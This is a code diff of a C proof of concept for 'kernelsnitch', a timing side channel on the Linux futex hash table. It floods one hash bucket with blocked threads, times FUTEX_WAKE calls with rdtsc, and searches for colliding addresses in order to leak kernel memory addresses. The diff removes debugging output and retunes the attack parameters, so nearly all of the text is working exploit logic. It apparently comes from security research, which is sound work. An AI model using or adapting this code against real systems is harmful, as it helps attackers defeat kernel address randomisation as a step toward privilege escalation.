@@ -26,12 +26,12 @@
 #ifndef KS_PAGE_SIZE
 #define KS_PAGE_SIZE PAGE_SIZE
 #endif
-#define APPENDED_FUTEXES 256  // More waiters for stronger timing signal
-#define MULITPLE 4  // Standard search space
+#define APPENDED_FUTEXES 4096
+#define MULITPLE 4
 #if defined(__INTEL) || defined(__AMD)
 #define IDENTITY_START 0xffff888000000000ULL
 #define IDENTITY_END   0xffffc88000000000ULL
-#define COARSE_SZ (1ULL << 25)  // 32MB for smaller search spaces
+#define COARSE_SZ (1ULL << 30)
 #elif defined(__ARM)
 #define VA_BITS 39
 #if VA_BITS==39
@@ -50,7 +50,7 @@
 #else
 #error "Unsupported VA_BITS (expected 39 or 48)"
 #endif
-#define COARSE_SZ (1ULL << 25)  // 32MB for smaller search spaces
+#define COARSE_SZ (1ULL << 30)
 #endif
 
 enum kernelsnitch_state {
@@ -97,7 +97,7 @@ struct kernelsnitch_shared_state {
     int mte_enabled;
 };
 
-#define WAIT() do { usleep(100000); for (size_t i = 0; i < 100; ++i) sched_yield(); } while (0)  // 100ms for many threads
+#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)
 
 /**
  * FUTEX syscall
@@ -121,26 +121,8 @@ static void *__do_increase(void *arg)
     struct inc_arg *inc_arg = (struct inc_arg *)arg;
     struct kernelsnitch_shared_state *ks = inc_arg->ks;
     size_t id = inc_arg->id;
-    free(inc_arg);  // Free early to avoid leak
-    
-    // Block on the futex at ks->inc_futex[id]
-    // This is what the timing measurement will measure
-    unsigned int *futex_ptr = (unsigned int *)&ks->inc_futex[id];
-    unsigned int futex_val = *futex_ptr;
-    
-    // FUTEX_WAIT_PRIVATE returns immediately if *futex_ptr != expected_value
-    // We expect 0, but check what the actual value is
-    if (futex_val != 0) {
-        fprintf(stderr, "THREAD_FUTEX_NONZERO: id=%zd val=%u\n", id, futex_val);
-        return 0;  // Exit immediately
-    }
-    
-    // Block until woken
-    long ret = syscall(SYS_futex, futex_ptr, FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0);
-    
-    // Should not reach here since no one will wake us
-    fprintf(stderr, "THREAD_EXIT: futex returned %ld, errno=%d\n", ret, errno);
-    
+    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
+    free(inc_arg);
     return 0;
 }
 
@@ -152,109 +134,21 @@ static void *__do_increase(void *arg)
  */
 static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
 {
-    // Debug: show which thread we're running from
-    pid_t mypid = getpid();
-    pid_t mytid = syscall(SYS_gettid);
-    fprintf(stderr, "DEBUG_ENTER __increase: pid=%d tid=%d amount=%zd id=%zd\n", mypid, mytid, amount, id);
-    fflush(stderr);
-    
     pthread_t tid;
-    if (ks->verbose) pr_info("adding %zd waiters to bucket ID=%zd\n", amount, id);
-    
-    // Use small stack (64KB instead of default 8MB) to avoid VMA exhaustion
-    pthread_attr_t attr;
-    pthread_attr_init(&attr);
-    pthread_attr_setstacksize(&attr, 64 * 1024);  // 64KB stack
-    
-    size_t success_count = 0;
-    int first_error = 0;
-    size_t first_error_idx = 0;
-    
-    // Small delay between batches to allow threads to start
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
         inc_arg->id = id;
         inc_arg->ks = ks;
-        int ret = pthread_create(&tid, &attr, __do_increase, (void *)inc_arg);
-        if (ret != 0) {
-            if (!first_error) {
-                first_error = ret;
-                first_error_idx = i;
-            }
-            free(inc_arg);
-            continue;
-        }
-        success_count++;
-        
-        // Yield every 100 threads to let them start
-        if (i % 100 == 0) {
-            sched_yield();
-        }
+        SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
     }
-    
-    pthread_attr_destroy(&attr);
-    
-    // Give threads time to actually start and block
-    // Wait longer since threads need to be scheduled
-    usleep(1000000);  // 1 second
-    
-    // Check thread count via /proc/self/task (more reliable than Threads: field)
-    {
-        pid_t mypid = getpid();
-        pid_t mytid = syscall(SYS_gettid);
-        
-        // Count entries in /proc/self/task
-        DIR *dir = opendir("/proc/self/task");
-        int task_count = 0;
-        if (dir) {
-            struct dirent *ent;
-            while ((ent = readdir(dir)) != NULL) {
-                if (ent->d_type == DT_DIR && ent->d_name[0] != '.') {
-                    task_count++;
-                }
-            }
-            closedir(dir);
-        }
-        
-        pr_warning("THREAD_COUNT_AFTER_WAIT: pid=%d tid=%d task_count=%d (created %zd)\n", 
-                   mypid, mytid, task_count, success_count);
-    }
-    
-    if (first_error) {
-        pr_error("pthread_create first failed at i=%zd: %s (errno=%d), succeeded %zd/%zd\n", 
-                 first_error_idx, strerror(first_error), first_error, success_count, amount);
-    }
-    
-    // Verify waiters are actually blocked by checking /proc
-    char path[64];
-    snprintf(path, sizeof(path), "/proc/%d/status", getpid());
-    FILE *f = fopen(path, "r");
-    if (!f) {
-        pr_error("cannot open %s: errno=%d\n", path, errno);
-    } else {
-        char line[256];
-        int threads = 0;
-        while (fgets(line, sizeof(line), f)) {
-            if (sscanf(line, "Threads: %d", &threads) == 1) break;
-        }
-        fclose(f);
-        // Force output with pr_warning which has different level
-        pr_warning("THREAD_COUNT: success=%zd/%zd, process has %d threads\n", 
-                   success_count, amount, threads);
-        fflush(stdout);
-        fflush(stderr);
-    }
-    
     WAIT();
-    
-    if (ks->verbose) pr_info("waiters added, checking timing...\n");
 }
 
 /**
  * Simple compare
  */
-#define REPEAT_MEASUREMENT 128  // From kernelsnitch paper
-#define AVERAGE (1<<3)  // Use median 8
+#define REPEAT_MEASUREMENT 128
+#define AVERAGE (1<<3)
 static int __compare(const void *a, const void *b)
 {
     return (*(size_t *)a - *(size_t *)b);
@@ -262,27 +156,22 @@ static int __compare(const void *a, const void *b)
 
 /**
  * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
- * MediaTek 4.14: FUTEX_WAKE with count=0 shows inverted timing (faster for busy buckets)
  * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
- * @return averaged time of the futex operation
+ * @return averaged time of the futex wait operation
  */
 static size_t __measure(size_t futex_addr)
 {
     size_t t0;
     size_t t1;
     size_t time = 0;
+    // do some simple signal processing and reject bad ones
     size_t __times[REPEAT_MEASUREMENT];
-
     for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
         sched_yield();
         t0 = rdtsc_begin();
-        int ret = __futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
+        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
         t1 = rdtsc_end();
-        if (ret < 0) {
-            __times[l] = 1000000;  // error
-        } else {
-            __times[l] = t1 - t0;
-        }
+        __times[l] = t1 - t0;
     }
     qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
     for (size_t l = 0; l < AVERAGE; ++l)
@@ -372,7 +261,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->mm_struct = -1;
     ks->mm_struct_sz = __mm_struct_sz;
     ks->mm_slab_order = __mm_slab_order;
-    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN);  // FIXED: Use actual CPU count for correct hash size
+    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
     ks->thread_cnt = __thread_cnt;
     ks->collisions = __collision_cnt;
     ks->verbose = __verbose;
@@ -412,7 +301,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 {
     #define ID 128
 #ifndef KERNELSNITCH_THRESHOLD_MULT
-#define KERNELSNITCH_THRESHOLD_MULT 100  // From kernelsnitch paper: significant timing difference
+#define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
     size_t count = 0;
     size_t wanted;
@@ -423,47 +312,26 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     wanted = ks->collisions - 1;
 
     size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
-    if (ks->verbose) pr_info("baseline timing: %zd cycles\n", approx_time);
 
     // piled-up hash bucket ID 128
-    // Note: We can't calculate the actual hash without knowing the mm_struct
-    // The bruteforce phase will try different mm_struct values to find collisions
-    // For debugging, we use 0 as a placeholder mm_struct
-    if (ks->verbose) pr_info("Searching for collisions with unknown mm_struct...\n");
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
     __increase(ks, ID, APPENDED_FUTEXES);
     if (ks->verbose) pr_info("start finding collisisons\n");
 
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
-    size_t target_timing = __measure(ks->futex_addrs[0]);
-    if (ks->verbose) pr_info("target    %016zx (timing=%zd)\n", ks->futex_addrs[0], target_timing);
-    // Show statistics about the search
-    size_t max_time = 0;
-    size_t max_idx = 0;
-    size_t samples_checked = 0;
+    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
     for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
         if (id >= FUTEX_SZ)
             break;
-        samples_checked++;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(futex_addr);
-        if (ks->times[i] > max_time) {
-            max_time = ks->times[i];
-            max_idx = i;
-        }
-        // Standard timing: colliding addresses have SLOWER timing (more waiters in bucket)
-        // Look for addresses with timing > baseline * threshold
-        if (ks->times[i] > (approx_time * KERNELSNITCH_THRESHOLD_MULT)) {
+        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
             count++;
             ks->futex_addrs[count] = futex_addr;
-            if (ks->verbose) pr_info("  %016zx (timing=%zd, threshold=%zd) [COLLISION]\n", futex_addr, ks->times[i], approx_time * KERNELSNITCH_THRESHOLD_MULT);
+            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
         }
-    }
-    if (ks->verbose) {
-        pr_info("  checked %zd samples, max timing: %zd at idx %zd (threshold=%zd, target=%zd)\n",
-                samples_checked, max_time, max_idx, approx_time * KERNELSNITCH_THRESHOLD_MULT, target_timing);
     }
     if (wanted == count) {
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
